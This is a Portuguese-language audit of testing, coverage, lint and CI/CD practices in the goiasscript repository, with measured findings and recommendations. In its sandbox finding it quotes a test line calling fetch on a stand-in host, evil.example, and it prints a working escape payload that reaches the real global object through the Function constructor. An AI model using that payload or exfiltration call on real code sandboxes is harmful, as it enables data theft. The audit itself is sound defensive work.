# Auditoria — Testes, CI/CD e quality gates

Data: 2026-10-13. Repo: `Gefferson-Souza/goiasscript`, branch `feat/v1.5-launch-playground-engoianador` @ `cacbbcd` (conteúdo igual ao de `origin/main`). Ambiente: Node v24.21.0, pnpm 10.31.0 via `corepack`. Repo tratado como somente leitura; todos os experimentos (mutação, destruição de módulos, `prettier --write`, probes) rodaram em cópias no scratchpad (`audit/probes-qa/`). Hipóteses e conhecimento prévio não verificado (a rede estava restrita a `gh` em leitura) estão marcados como tal. Referências `QA-nn` apontam para os achados abaixo.

## Resumo executivo

1. A infraestrutura de qualidade existe e roda verde, mas é consultiva: nenhum hook local existe (`.husky/` não tem scripts e nem é rastreado), `main` não tem proteção nem exige checks, o único check de formatação é mascarado por `continue-on-error`, e os PRs #5 e #6 foram mesclados pelo próprio autor sem review.
2. Dos 85 testes do core, 49 (58%) não exercitam código alcançável por nenhum consumidor (16 tautológicos sobre mocks, 23 sobre `lexer.js` morto, 10 sobre métodos sem chamador); 53 (62%) se contarmos 4 wrappers públicos sem uso interno. Um mutation probe artesanal em `simpleTranspiler.js` matou 28 de 119 mutantes (23,5%) e nenhuma das 53 regras de reescrita JS para goiano é coberta.
3. Nenhum teste verifica que o JS gerado é JS: 9 dos 15 `.gs` do repositório geram JS inválido com `success: true` e a suíte segue verde.
4. A cobertura declarada (63,3%) cai para 36,1% quando `bin/` (o CLI publicado) entra no denominador; o threshold é 50% contra a regra do dono de 80%, e a promessa de voltar a 80% "na Fase 1" venceu (W20 consta como entregue).
5. O Worker tem bons testes comportamentais nos 3 módulos testados (12 de 15 mutantes mortos), mas `index.ts` e `engoiana.ts` não têm nenhum (0 de 8, incluindo a trava de `x-forwarded-for`). O E2E é bem escrito, mas o teste de sandbox só tenta `fetch` direto, a única via que o sombreamento de globais realmente bloqueia.
6. Não há workflow de release (nem provenance, nem tag `v1.5.0`), o tarball sai sem README/LICENSE, e o CI não roda desde 2026-06-01 com aviso de remoção do Node 20 em 2026-09-16 (hipótese: pode estar quebrado hoje).
7. Veredito: manter a espinha (pnpm workspace, jobs do CI, Playwright, Vitest do Worker); reescrever a camada de enforcement (hooks, ESLint, thresholds, proteção de branch) e cerca de metade da suíte do core. Contagem: CRITICAL 0, HIGH 8, MEDIUM 9, LOW 8.

## Métricas

### 1. Comandos executados na raiz

| Comando | Exit | Saída resumida |
|---|---|---|
| `corepack pnpm test:coverage` | 0 | 5 suítes, 85/85 testes, `Snapshots: 0 total`, 1,3 s (2,4 s no total). Cobertura global 63,3% stmts, 49,78% branches, 57,54% funções, 62,79% linhas (thresholds 50/40/50/50: passa) |
| `corepack pnpm lint` | 0 | `eslint src/ tests/`: 0 erros, 84 warnings (45 `no-console`, 34 `no-useless-escape`, 4 `max-len`, 1 `complexity`); 3,6 s |
| `corepack pnpm format:check` | 1 | 10 arquivos fora do Prettier: `src/cli/index.js`, `src/compiler/simpleTranspiler.js`, `src/errors/ErroGoiano.js`, `src/errors/errorTranslator.js`, `tests/setup.js`, `tests/unit/{cli,compiler,errors,goianoBuiltins,lexer}.test.js` |
| `corepack pnpm engoianador:typecheck` | 0 | `tsc --noEmit` sem erros (1,4 s) |
| `corepack pnpm engoianador:test` | 0 | Vitest 4.1.8: 3 arquivos, 16/16 testes (0,5 s) |

Nota de ambiente: `pnpm` não está no PATH e os scripts da raiz chamam `pnpm --filter ...`, então a primeira tentativa de `test:coverage` e `lint` falhou com `sh: 1: pnpm: not found` (exit 1). Criei um shim fora do repo (`audit/probes-qa/bin/pnpm`, que faz `exec corepack pnpm "$@"`) e refiz os cinco comandos; os exit codes acima são os da segunda rodada. Logs: `audit/probes-qa/01..05-*.log` e `.exit`.

### 2. Suíte do core (`packages/core/tests`, 969 linhas)

| Arquivo | Testes | O que exercita de fato | Consumidor do código testado |
|---|---:|---|---|
| `unit/cli.test.js` | 16 | mocks de `fs`, `path`, `process.argv` e o spy do Jest | nenhum (não importa `src/` nem `bin/`) |
| `unit/lexer.test.js` | 23 | `src/compiler/lexer.js` (10 testes em métodos privados) | nenhum (só citado em comentário, `simpleTranspiler.js:356`) |
| `unit/goianoBuiltins.test.js` | 18 | 4 de runtime (substring), 4 de wrappers públicos, 10 de métodos sem chamador | o transpilador só usa `gerarImplementacaoGoiana` e `converterParaGoiano` |
| `unit/compiler.test.js` | 18 | `GoiasScriptCompiler` (`toContain` no JS; 1 execução) | CLI; não o `GoiasScriptBrowserCompiler` do playground (`browser.js` 0%) |
| `unit/errors.test.js` | 10 | `ErroGoiano` e `ErrorTranslator` (comportamento) | transpilador (`catch`) |
| Total | 85 | comportamentais e de código vivo: 32 (38%) | |

Independência: as 5 suítes passam com `--randomize --seed` 1, 42 e 20261013, com `--runInBand` e cada uma isolada. Não há `__snapshots__` nem `toMatchSnapshot`.

### 3. Cobertura em três cenários (Jest/Istanbul)

| Cenário | Stmts | Branches | Funções |
|---|---:|---:|---:|
| A. configuração atual (`src/**`) | 63,3% (326/515) | 49,8% (115/231) | 57,5% (61/106) |
| B. `src/**` + `bin/**` | 36,1% (326/904) | 30,4% (115/378) | 38,4% (61/159) |
| C. B sem `lexer.js` (código morto) | 33,4% (289/866) | 27,2% (98/360) | 35,9% (55/153) |

Por arquivo (stmts): `src/cli/index.js` 0/126; `bin/goiasscript.js` 0/237; `bin/goias.js` 0/152; `src/browser.js` 0/10; `src/compiler.js` 60/94; `errorTranslator.js` 52/63 (branches 45,5%); `ErroGoiano.js` 18/22; `GoianoBuiltins.js` 25/26 (o runtime de 246 linhas, `GoianoBuiltins.js:119-364`, é um único statement); `simpleTranspiler.js` 134/136 (98,5%; branches 95,1%); `lexer.js` 37/38.

### 4. Mutation probes artesanais (`probes-qa/mutate.js`, `probes-qa/wmut/run.js`; não é Stryker)

| Alvo | Mutantes | Mortos | Sobreviventes | Observação |
|---|---:|---:|---:|---|
| `simpleTranspiler.js`, tabela de mapeamentos (`:89-172`) | 55 | 20 | 35 | 2 sobreviventes são equivalentes (`:161-162` duplicam `:143-144`); 33 de 53 mapeamentos únicos sem cobertura |
| `simpleTranspiler.js`, `_convertJSMethodsToGoiano` (`:220-289`) | 53 | 0 | 53 | nenhuma regra `.length`, `console.log(`, `Math.*` etc. é testada |
| `simpleTranspiler.js`, ramos manuais | 11 | 8 | 3 | sobrevivem: `_checkForbiddenMethods`, prefixo do runtime (`:43`), `_removeTypeAnnotations` |
| Total transpilador | 119 | 28 | 91 | score 23,5% (aprox. 24% sem os 2 equivalentes) |
| Worker, módulos testados (`rate-limit`, `cors`, `prompt`) | 15 | 12 | 3 | 80% |
| Worker, módulos sem teste (`index.ts`, `engoiana.ts`) | 8 | 0 | 8 | 0% |

Mortos = `jest`/`vitest` com exit code diferente de 0 na cópia mutada. Sobreviventes são robustos (a suíte inteira passou com o comportamento alterado); mortos podem estar levemente inflados por mutantes que quebram o carregamento.

### 5. CI/CD e governança (inventário)

| Item | Estado | Fonte |
|---|---|---|
| Workflows | 1 (`ci.yml`, 145 linhas); nenhum de release, CodeQL ou schedule | `gh workflow list` |
| Gatilhos | `push` em `main`, `staging`, `feat/**`; `pull_request` para `main`, `staging`; sem `workflow_dispatch`/`schedule` | `ci.yml:3-7` |
| Matriz de Node | 18.x, 20.x, 22.x só no job `test`; demais jobs em 20.x; sem 24 | `ci.yml:15,78,103,125` |
| Cache | `setup-node` com `cache: 'pnpm'` nos 4 jobs; sem cache de Playwright nem de `.next` | `ci.yml` |
| `permissions` | não declarado; padrão do repo `read`, `can_approve_pull_request_reviews: false` | `gh api .../actions/permissions/workflow` |
| Actions | por tag (`@v4`): checkout, pnpm/action-setup, setup-node, codecov-action, upload-artifact; repo com `allowed_actions: all`, `sha_pinning_required: false` | `ci.yml:19,22,26,46,141` |
| Segredos | nenhum `secrets.*`; Codecov sem `token:` | `ci.yml` |
| Checks obrigatórios | nenhum: `main` com `protected: false`, branch protection 404, rulesets `[]` | `gh api` |
| Últimos 10 runs | 10/10 `success`, de 2026-05-04 a 2026-06-01; último `26767778406` com 125 s; 6 checks no commit `2cf8946` | `gh run list` |
| Release/publish | nenhum workflow; `gh release list` vazio; só a tag `v2.0-pre-archive` | `gh`, `git tag` |
| Segurança do repo | secret scanning e push protection ligados; Dependabot alerts e security updates desligados; code scanning "no analysis found"; private vulnerability reporting desligado; sem `dependabot.yml`, sem `CODEOWNERS` | `gh api` |
| Política de merge | squash, merge commit e rebase permitidos; `delete_branch_on_merge: false` | `gh api repos/...` |
| Conventional Commits | 47/62 (75%) no histórico; 24/26 (92%) desde 2026-05-01 | `git log` |

### 6. Lint, formato, tipos e limites

| Medida | Resultado |
|---|---|
| ESLint 8.57.1, formato legado `.eslintrc.js`, só `eslint:recommended` | escopo `src/ tests/` do core: 0 erros, 84 warnings |
| ESLint em `bin/` + `jest.config.js` (fora do gate) | 66 erros e 132 warnings (`indent` 36, `quotes` 23, `comma-dangle` 4, `no-eval` 2, `no-unused-vars` 1) |
| ESLint do playground (`next/core-web-vitals`) em `app components lib workers scripts types` | 0 erros, 0 warnings; `tsc --noEmit` do playground: exit 0 |
| Worker e `playground-e2e` | sem lint; `tsc` do Worker só inclui `src/` (com `test/` incluído também compila limpo) |
| Prettier 2.8.8 em `apps/*` com o `.prettierrc` da raiz | 9 de 31 arquivos TS/TSX divergentes; o `format` do core só cobre `src/**` e `tests/**` |
| `prettier --write` seguido de ESLint (cópias) | 0 erros antes, 11 erros depois (7 `comma-dangle`, 4 `quotes`) |
| Simulação dos limites do dono (ESLint temporário em `src` + `bin`) | `max-lines-per-function` 50: 9; `complexity` 10: 4; `max-lines` 400 (sem brancos/comentários): 1 arquivo; `max-params` 4: 1; `max-depth` 4: 0 |
| `tsc --allowJs --checkJs` no core (config temporária) | não estrito: 6 erros (3 são só `resolveJsonModule` ausente na minha config); estrito: 240 erros |
| Husky/lint-staged/commitlint | `.husky/` sem hooks; `lint-staged` órfão; sem commitlint |
| size-limit, benchmark, knip, Lighthouse, Stryker, fast-check, CodeQL, Dependabot, renovate, publint, changesets, provenance, osv, zizmor, actionlint | nenhuma ocorrência no repo (busca em `*.json,yml,yaml,js,ts,md`) |

## Achados

Nenhum achado CRITICAL: nenhum item é vulnerabilidade explorável confirmada nem risco de perda de dados; os de segurança (QA-07, QA-08, QA-12) são lacunas de teste ou de automação, sem exploração demonstrada neste escopo.

### [HIGH] QA-01 — 49 dos 85 testes do core não exercitam código alcançável por nenhum consumidor

- Evidência:
  - `packages/core/tests/unit/cli.test.js:1-6`: só `require('fs')`, `require('path')`, `jest.mock('fs')`, `jest.mock('path')`; nenhum `require` de `src/` ou `bin/`. Os 16 testes afirmam o que o próprio teste mockou (`fs.existsSync.mockReturnValue(true)` seguido de `expect(...).toBe(true)`; `process.argv = [...]` seguido de `process.argv.slice(2)`; "Console Output" testa o spy do Jest). Prova: numa cópia, `src/cli/index.js`, `bin/goiasscript.js` e `bin/goias.js` foram trocados por `throw new Error(...)` e `cli.test.js` seguiu 16/16.
  - `lexer.test.js` (23 testes): `src/compiler/lexer.js` não é importado por nenhum arquivo de `src/` ou `bin/` (só um comentário em `simpleTranspiler.js:356`). Cópia com `lexer.js` destruído: falha só `lexer.test.js`; as outras 4 suítes seguem 62/62. Dez testes miram métodos privados (`_getTokenType` x6, `_tokenizeLine` x4).
  - `goianoBuiltins.test.js` (18): 10 testes cobrem métodos sem nenhum chamador em `src/`, `bin/` ou `apps/` (`obterEquivalenteGoiano` `:28-35`, `detectarMetodosProibidos` `:103-127`, `obterDocumentacaoMetodo`/`obterExemploUso` `:130-143`, `converterTipoParaGoiano` `:146-157`, `ehMetodoOtimizado`/`obterVersaoOtimizada` `:160-170`); 4 cobrem wrappers públicos sem consumidor interno (`ehMetodoProibido`, `listarMetodosGoianos`, `listarTiposGoianos`; só `compiler.js:177,185,214` e `browser.js:20,24,28` os chamam, e nada chama esses wrappers); 4 tocam `gerarImplementacaoGoiana` (`:39-79`) com `toContain` na string do runtime, sem executá-lo. `converterParaGoiano`, que o transpilador chama (`simpleTranspiler.js:318`), não tem teste direto.
  - Mutation probe: 28 de 119 mutantes mortos (ver Métricas, seção 4). A tabela `compiler.test.js` também tem dois títulos enganosos: `:197` ("erro de compilação na execução") afirma `execution_error`; `:233` ("erro durante tokenização") testa declaração incompleta.
  - Soma: 16 + 23 + 10 = 49 de 85 (58%); 53 (62%) com os 4 wrappers. Comportamentais e de código vivo: 32 (38%).
- Regra/critério violado: `testing.md` (testar comportamento, não implementação; coverage como proteção); `code-review.md` ("Tests exist for new functionality").
- Impacto: o "85 tests passando" do `README.md:218` comunica proteção que não existe; refatorar o transpilador não tem rede de segurança; o CI fica verde para as regressões de QA-02.
- Recomendação: apagar `cli.test.js` e substituí-lo por testes de subprocesso (gate G7); apagar `lexer.test.js` junto com `lexer.js`, ou ligar o lexer ao pipeline e reescrever os testes; apagar os 10 testes de API sem chamador junto com os métodos (confirmar com `knip`); reescrever o resto com oráculo de JS válido e golden (G5); medir com StrykerJS (G12).

### [HIGH] QA-02 — Nenhum teste valida o JS gerado: exemplos publicados quebram com a suíte verde

- Evidência:
  - As asserções de transpilação são `toContain` de trechos (`compiler.test.js:11-111`); um único teste executa o JS e confere a saída (`compiler.test.js:175-185`); `Snapshots: 0 total` (`probes-qa/01-test-coverage.log`).
  - `probes-qa/examples-probe.js` (compila cada `.gs` e passa o JS por `new vm.Script()`; se parseia, executa em `vm` com timeout): dos 15 `.gs` do repo (11 em `examples/`, 3 em `templates/`, 1 fixture), 9 geram JS inválido com `compile().success === true`: `examples/advanced/{teste_classes,teste_classes_simples,teste_instanceof}.gs`, `examples/async/async_exemplo.gs`, `examples/basic/exemplo_simples.gs`, `examples/classes/exemplo_classes.gs`, `templates/projeto-basico/{src/main,tests/test}.gs` e `tests/fixtures/test-basic.gs` (único fixture, não usado por nenhum teste). 6 dos 11 exemplos que seguem no tarball estão nesse grupo. Causa imediata: `presta_serviço` não está na tabela (`simpleTranspiler.js:89-172`).
  - `probes-qa/edge-probe.js` e `edge-probe2.js` (todos com `success: true`): regex literal com palavra-chave (`/mais|menos/` vira `/+|-/`, SyntaxError); `vixe "xi"` vira `throw new Error "xi"`; string não fechada (`prosa("abc);`); `para_com_isso;` e `continua_aí;` ficam intactos e dão `ReferenceError` (o ramo de palavras acentuadas/com `_` exige `\s`, `$`, `)`, `,` ou `(` depois, `simpleTranspiler.js:183-190`); `{ length: 7 }.length` vira `.tamanho()` e dá `TypeError` (`:235`); palavras-chave dentro de template literal e de comentário são reescritas (`Tem mais de` vira `Tem + of`); identificador `__STRING_0__` colide com o placeholder (`:72-80`, `:199-201`).
  - Runtime executado em `vm` (`probes-qa/runtime-probe.js`, 24 expressões, 2 falhas): `"a.b.c".trocar(".", "-")` devolve `"-----"` e `"1+1".trocar("+", "-")` lança SyntaxError (`GoianoBuiltins.js:128-130`, `new RegExp(buscar, 'g')`). Invisível aos testes porque o runtime (`:119-364`) é uma template string que eles só inspecionam com `toContain`.
- Regra/critério violado: pedido da auditoria ("testes que EXECUTAM o JS gerado e conferem a saída"; "golden/snapshot"); `testing.md` (casos de borda e erro).
- Impacto: `compile().success` não implica JS válido, e nenhum gate percebe; quase dois terços dos `.gs` que acompanham o produto não rodam. Os bugs em si pertencem ao escopo do auditor do núcleo; aqui o achado é a ausência do oráculo que os pegaria.
- Recomendação: helper `expectValidJs` com `acorn.parse` (ou `vm.Script`) chamado em todo teste de transpilação; suíte golden data-driven sobre `examples/**/*.gs` e `templates/**/*.gs` comparando `.expected.js` e a saída executada em `vm` com timeout; `fast-check` para invariantes (G5, G13).

### [HIGH] QA-03 — Cobertura enganosa: 63,3% declarado, 36,1% real, threshold 50% (regra do dono: 80%)

- Evidência:
  - `packages/core/jest.config.js:15` (`collectCoverageFrom: ['src/**/*.js', ...]`) deixa de fora `bin/goiasscript.js` (654 linhas) e `bin/goias.js` (424 linhas), que são os `bin` do pacote (`package.json:14-17`). Thresholds `:20-27`: branches 40, functions 50, lines 50, statements 50.
  - Cenários da seção 3 das Métricas (medidos com `--collectCoverageFrom` e `--coverageDirectory` no scratchpad): 63,3% (A), 36,1% (B), 33,4% (C). CLI, REPL e `browser.js` (entry do playground, `runner.worker.ts:6`) em 0%.
  - `simpleTranspiler.js` tem 98,5% de statements e 95,1% de branches, mas só 23,5% dos mutantes mortos: a métrica não distingue "executou" de "verificou" (a tabela de 53 mapeamentos é um statement).
  - `jest.config.js:17-19`: "Meta de 80% retorna na Fase 1 (W20)"; `CONTRIBUTING.md:156` marca W20 como entregue e `:179` ainda lista "Voltar coverage threshold pra 80%". Mesmo o item `:176` (testar `src/cli/index.js`) não alcançaria `bin/`.
- Regra/critério violado: `testing.md` (cobertura mínima 80%); regra de processo "Verify coverage (80%+)".
- Impacto: a meta fica invisível; o número que o CI exibe sobrestima a proteção em quase 2x.
- Recomendação: incluir `bin/` (ou mover a lógica do `bin` para módulos testáveis e deixar o `bin` fino) e `apps/*/src` no escopo; thresholds por arquivo (Vitest `coverage.thresholds.perFile`); escada 65, 75, 80 com Codecov `patch` em 80% (G6).

### [HIGH] QA-04 — Nenhum gate é obrigatório: sem hooks, sem proteção de branch, sem review

- Evidência:
  - `git ls-files .husky` vazio; o `.husky/` local tem só `_/husky.sh` e `_/.gitignore` (conteúdo `*`), gerados por `husky install` (`package.json:21`); `git config core.hooksPath` = `.husky`; não há `pre-commit`, `commit-msg` nem `pre-push`; `.git/hooks` só tem `.sample`; `git log --all -- .husky` vazio. O bloco `lint-staged` (`package.json:27-34`) nunca é invocado.
  - Sem commitlint. Conventional Commits: 47/62 (75%) no histórico, 24/26 (92%) desde 2026-05-01; os 2 fora do padrão são `26b6857` e o merge `a19bf17`.
  - `gh api repos/Gefferson-Souza/goiasscript/branches/main/protection`: 404 "Branch not protected"; `.../rulesets`: `[]`; `.../branches/main`: `protected: false`.
  - `gh pr view 5` e `6`: `mergedBy: Gefferson-Souza`, 0 reviews, 0 review requests (30 e 7 commits). Foi usado merge commit, apesar de `CONTRIBUTING.md:186` ("Squash & merge é o padrão") e `:184` ("Sem regressão em coverage", que nenhum gate checa).
  - O `validate-commit-message.sh` do dono vive em `<home>/.claude/` (fora do repo; não alcança colaboradores nem o CI), e o `quality-pretooluse.mjs` só olha `.ts/.tsx` (texto de `comments.md`); o core é `.js`.
- Regra/critério violado: CLAUDE.md global ("Push só após CI verde local"; commits pequenos com padrão); `hooks.md`; `code-review.md` ("Before any commit to shared branches"); `CONTRIBUTING.md:184-186`.
- Impacto: toda barreira de qualidade depende de disciplina individual; um push direto, uma mensagem fora do padrão ou um merge com CI vermelho passam sem atrito.
- Recomendação: G1 (Husky 9 com `pre-commit`, `commit-msg`, `pre-push` versionados) e G2 (ruleset em `main` com PR e checks obrigatórios). A configuração do GitHub é ação do dono; não foi feita.

### [HIGH] QA-05 — Sem pipeline de release nem gate de pacote (tarball sem README/LICENSE, sem tag, sem provenance)

- Evidência:
  - `gh workflow list` mostra só `CI/CD GoiásScript`; `ci.yml` não tem `publish`, `id-token: write`, `--provenance` nem gatilho de tag; `gh release list` vazio; a única tag é `v2.0-pre-archive` (não existe `v1.5.0`, embora `CHANGELOG.md:8-10` descreva a 1.5.0 como "lançamento estável").
  - `npm pack --dry-run --json` em `packages/core` (`probes-qa/npm-pack.json`): 29 entradas, sem `README.md`, `LICENSE` e `CHANGELOG.md` (declarados em `package.json:68-70`, mas existentes só na raiz do monorepo), com `src/compiler/lexer.js` (morto) e 12 arquivos em `examples/` (6 `.gs` geram JS inválido, QA-02).
  - Nenhum passo de CI roda `npm pack`, `publint` ou instala o tarball. Fato conhecido: no npm só existe `goiasscript@2.0.0` (o monólito arquivado).
- Regra/critério violado: pedido da auditoria (workflow de release, provenance/trusted publishing); regra de processo (CI/CD antes de entregar).
- Impacto: a publicação seria manual, a partir de um laptop, sem proveniência verificável, com um pacote já defeituoso (sem licença nem README no tarball).
- Recomendação: G8 (verificação de pacote) e G9 (release por tag com Trusted Publishing do npm via OIDC, ou `npm publish --provenance` com `id-token: write`).

### [HIGH] QA-06 — CI sem execução há 4,4 meses e com avisos de remoção do Node 20 (hipótese: pode estar quebrado)

- Evidência:
  - `gh run list -L 10`: último run `26767778406` em 2026-06-01T16:27:30Z; hoje é 2026-10-13.
  - `gh api repos/.../check-runs/<id>/annotations` (nos 6 jobs): "Node.js 20 actions are deprecated. The following actions are running on Node.js 20 ...: actions/checkout@v4, actions/setup-node@v4, codecov/codecov-action@v4, pnpm/action-setup@v4. Actions will be forced to run with Node.js 24 by default starting June 16th, 2026. Node.js 20 will be removed from the runner on September 16th, 2026."
  - `ci.yml:15` matriz `18.x/20.x/22.x`; jobs restantes em 20.x (`:78,103,125`). Pelo calendário de releases do Node (conhecimento prévio, não verificado): 18 em EOL desde 2025-04, 20 em EOL desde 2026-04, 24 é LTS ativo; a matriz não tem 24 e o dono usa 24.21 localmente. Não há `.nvmrc`.
  - Sem `schedule` nem `workflow_dispatch` (`ci.yml:3-7`): nada detecta apodrecimento do ecossistema (mesma classe de falha do modelo Groq descontinuado, fato conhecido).
- Regra/critério violado: pedido da auditoria (matriz de Node, saúde do CI); regra de processo "CI verde".
- Impacto: hipótese não verificável sem disparar o workflow (ação de escrita, fora do meu escopo): ao menos uma action `@v4` pode já falhar ou rodar forçada em Node 24. O próximo push pode ser o primeiro a revelar.
- Recomendação: o dono dispara `gh workflow run` ou empurra um branch descartável para medir; subir as actions para majors que declarem `node24` (conferir nos releases de cada uma), pinar por SHA, matriz 22 e 24, `schedule` semanal e `workflow_dispatch` (G9).

### [HIGH] QA-07 — A fronteira de segurança do sandbox só é testada pela via que o sombreamento bloqueia

- Evidência:
  - `apps/playground/workers/runner.worker.ts:52-75`: o código do usuário roda em `new Function('console', ...DANGEROUS, ...)` com os globais perigosos recebidos como parâmetros-`Proxy`; os comentários `:44-50` admitem que "o isolamento REAL é dado pela CSP".
  - `apps/playground-e2e/tests/security.spec.ts:15-40`: injeta `fetch("https://evil.example/roubo")` (a via direta, bloqueada por construção pelo sombreamento) e afirma "Acesso negado" e `chamou === false`; o teste passaria mesmo sem CSP. `:4-13` só confere que o header contém a substring `connect-src 'self'`.
  - `probes-qa/sandbox-probe.js` (mesma técnica, rodando em Node): `fetch(...)` e `self.fetch` dão "Acesso negado"; `({}).constructor.constructor("return globalThis")().fetch` e `(()=>{}).constructor("return globalThis")().fetch` retornam `function`, ou seja, o construtor de `Function` devolve o global real. No navegador é hipótese de alta confiança (mesma semântica de `Function`), não executada porque o E2E estava fora do meu escopo.
- Regra/critério violado: `security.md` (XSS/CSP, validar entrada); `subagent-delegation-and-ui.md` §2 ("critério de pronto é evidência observada").
- Impacto: a barreira real (CSP `connect-src 'self'` em `next.config.mjs:11-22`, `:18` para o `connect-src`) nunca é exercitada; uma regressão na CSP que mantenha a substring passaria no E2E.
- Recomendação: adicionar ao E2E o payload de escape e provar que a requisição é barrada (evento `securitypolicyviolation` ou erro de console, mais `page.route` com `chamou === false`); `no-new-func` como erro no playground com `-- motivo` (hoje a diretiva `eslint-disable-next-line no-new-func` em `runner.worker.ts:73` é inútil: `--report-unused-disable-directives` a aponta, porque a regra nem está ligada).

### [HIGH] QA-08 — Worker: `index.ts` e `engoiana.ts` sem nenhum teste (0 de 8 mutantes mortos)

- Evidência:
  - `apps/engoianador-api/test/*.ts` importam só `cors`, `prompt`, `rate-limit` e o tipo `Env`. `src/index.ts` (112 linhas) e `src/engoiana.ts` (83) ficam sem teste: 195 de 347 linhas (56%, por inspeção; não há `@vitest/coverage-v8`, `node_modules/@vitest` não existe).
  - Mutation probe do Worker (23 mutantes manuais, `probes-qa/wmut/result.txt`): módulos testados 12/15 mortos; sem teste 0/8: `index.ts:77` (`cf-connecting-ip` trocado por `x-forwarded-for`, a correção do achado CRITICAL do pré-lançamento `a27cd41`, comentada em `:75-76`), `:66` (limite de entrada ignorado), `:69` (413 para 400), `:92` (429 sem `Retry-After`), `:107` (502 para 200); `engoiana.ts:28` (fallback Workers AI), `:49` (timeout de 15 s), `:60,70` (`stripWrappingQuotes`). `engoiana.ts:13` fixa `llama-3.1-70b-versatile`, descontinuado pela Groq (fato conhecido), sem teste nem canário.
  - Sobreviventes nos módulos testados: remover `expirationTtl` (`rate-limit.ts:52`; `helpers.ts:9`, o `put` do `fakeKV` ignora opções), limite default 20 para 0 (`rate-limit.ts:40`), regex sem a flag `i` em `prompt.ts`.
- Regra/critério violado: `testing.md` (integração de endpoints de API); `security.md` (rate limiting; erros sem vazar dados).
- Impacto: as correções de segurança do pré-lançamento (IP não spoofável, limites, mapeamento de status) podem regredir sem aviso; os testes bons de `rate-limit`, `cors` e `prompt` cobrem as funções puras, não o caminho HTTP.
- Recomendação: testar `worker.fetch(request, env)` diretamente (Request e Response existem no Node >= 18; `fakeKV` e `makeEnv` já existem): 400, 404, 413, 429 com `Retry-After`, 503, 502, `OPTIONS`, IP não spoofável; stub de `fetch` da Groq (200, 4xx, timeout) e fallback; threshold 80% com `@vitest/coverage-v8`; avaliar `@cloudflare/vitest-pool-workers` (conferir compatibilidade com Vitest 4.1.8 e wrangler 3.114.17); incluir `test/` no `tsconfig.json:15` (compila limpo: exit 0) (G14).

### [MEDIUM] QA-09 — `format:check` falha (10 arquivos), é mascarado no CI e conflita com o ESLint

- Evidência:
  - `corepack pnpm format:check`: exit 1 (lista na seção 1 das Métricas). `ci.yml:37-39`: `continue-on-error: true`. Os 3 jobs `test` do último run têm a anotação de falha "Process completed with exit code 1" e a etapa de upload para o Codecov é pulada em 18.x e 22.x, então a falha só pode vir desta etapa (inferência; os logs expiraram, HTTP 410, e a linha citada pela anotação, `.github:31`, não bate com a etapa, `:37`).
  - Conflito: `.prettierrc:3` `"trailingComma": "es5"` contra `.eslintrc.js:24` `'comma-dangle': ['error', 'always-multiline']` (com `ecmaVersion: 'latest'` vale também para argumentos de função; confirmado com um trecho multilinha que o ESLint reprova sem a vírgula). Experimento em cópias (`probes-qa/conflict-*.json`): ESLint com 0 erros antes do `prettier --write` e 11 depois (7 `comma-dangle`, 4 `quotes`) em `src/cli/index.js`, `simpleTranspiler.js`, `errorTranslator.js`, `errors.test.js`, `lexer.test.js`; exemplo: o Prettier remove a vírgula de `'g',` (`simpleTranspiler.js:188`) e de `''),` (`:319`).
  - Escopo: `format` e `format:check` do core só cobrem `src/**` e `tests/**`; `apps/*`: 9 de 31 arquivos TS/TSX divergentes; o `lint-staged` (órfão) prometia formatar `apps/**`.
- Regra/critério violado: `code-review.md` ("All automated checks passing"); `.github/pull_request_template.md` (checklist de formatação).
- Impacto: o gate de formatação é decorativo e, se ativado do jeito atual, brigaria com o lint; os dois estilos em `apps/` e `core/` já divergem.
- Recomendação: `trailingComma: "all"` (padrão do Prettier 3), `eslint-config-prettier` e remover `indent`, `quotes`, `semi`, `comma-dangle` do ESLint; rodar `prettier --write` uma vez; remover `continue-on-error`; criar `.prettierignore`; cobrir `apps/*` (G3).

### [MEDIUM] QA-10 — Lint não cobre `bin/` (66 erros) nem os apps; 84 warnings tolerados; rebaixamentos com promessa vencida

- Evidência:
  - `packages/core/package.json:24` (`eslint src/ tests/`): 0 erros, 84 warnings (`no-console` 45: 39 em `src/cli/index.js`, 3 em `src/errors/ErroGoiano.js:63,66,69`, 3 em `tests/setup.js:26,29,37`; `no-useless-escape` 34, 26 deles em `compiler.test.js`; `max-len` 4; `complexity` 1, `compiler.js:89`).
  - Fora do escopo (`probes-qa/eslint-bin.json`): `bin/` com 66 erros e 132 warnings: `no-eval` em `bin/goias.js:187` e `bin/goiasscript.js:86`, `no-unused-vars` em `bin/goias.js:174`, `indent` 36, `quotes` 23, `comma-dangle` 4; complexidade 17, 16 e 19 em `handleCommand` (`goias.js:216`), `traduz` (`goiasscript.js:27`), `arma_o_barraco` (`goiasscript.js:162`). Worker e `playground-e2e` não têm lint.
  - `.eslintrc.js:32-37` rebaixa `max-len`, `no-useless-escape` e `complexity` com "Voltam pra error na Fase 1" (marcador de fase e pendência, R2 de `comments.md`); `CHANGELOG.md:68` repete o rebaixamento.
  - O override de testes (`.eslintrc.js:42`, `files: ['tests/**/*.js', ...]`) é relativo à raiz do repo e não casa `packages/core/tests/setup.js` (por isso os 3 `no-console` seguem avisando); `sourceType: 'module'` (`:11`) com código CommonJS.
- Regra/critério violado: `code-generation-quality.md` itens 8 (sem `console.log`; `eslint-disable` com motivo) e 6; `comments.md` R2.
- Impacto: "lint verde" vale só para metade do código; o CLI publicado (a superfície que o usuário toca) tem dois `no-eval` e 63 erros de estilo fora do gate.
- Recomendação: ESLint 9 flat config com escopo `packages/*/{src,bin,tests}` e `apps/*`, `--max-warnings 0`, `no-eval` e `no-new-func` como erro (com `eslint-disable ... -- motivo`), `reportUnusedDisableDirectives`; para saída de CLI, um módulo de saída único (ou override pontual) em vez de 39 `console` espalhados (G4).

### [MEDIUM] QA-11 — Limites de tamanho, complexidade e tipos do dono não são gate (nem `checkJs`)

- Evidência:
  - A única regra ativa desse grupo é `complexity` em `warn` 10 (`.eslintrc.js:37`).
  - Simulação (config temporária `probes-qa/eslint-gates.json`, `src` + `bin`): `max-lines-per-function` 50: 9 violações (`bin/goiasscript.js` 2; `src/cli/index.js`, `src/compiler.js`, `lexer.js` 1 cada; `simpleTranspiler.js` 2, `_applySubstitutions` e `_convertJSMethodsToGoiano`; `GoianoBuiltins.js` 2, entre elas `gerarImplementacaoGoiana`); `complexity` 10: 4; `max-lines` 400 (sem brancos e comentários): 1 (`bin/goiasscript.js`); `max-params` 4: 1 (`ErroGoiano`); `max-depth` 4: 0; `no-magic-numbers`: 9.
